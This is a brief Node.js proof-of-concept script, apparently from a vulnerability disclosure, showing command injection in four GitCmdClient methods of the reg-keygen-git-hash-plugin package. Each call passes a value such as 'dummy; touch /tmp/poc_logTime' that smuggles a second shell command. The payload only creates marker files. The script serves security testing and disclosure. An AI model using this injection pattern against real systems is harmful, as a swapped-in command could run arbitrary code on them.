'use strict';

const { GitCmdClient } = require('reg-keygen-git-hash-plugin/lib/git-cmd-client');

const client = new GitCmdClient();

try {
  client.containedBranches('dummy; touch /tmp/poc_containedBranches');
} catch (e) {}

try {
  client.logTime('dummy; touch /tmp/poc_logTime');
} catch (e) {}

try {
  client.logBetween('HEAD', 'dummy; touch /tmp/poc_logBetween');
} catch (e) {}

try {
  client.mergeBase('HEAD', 'dummy; touch /tmp/poc_mergeBase');
} catch (e) {}
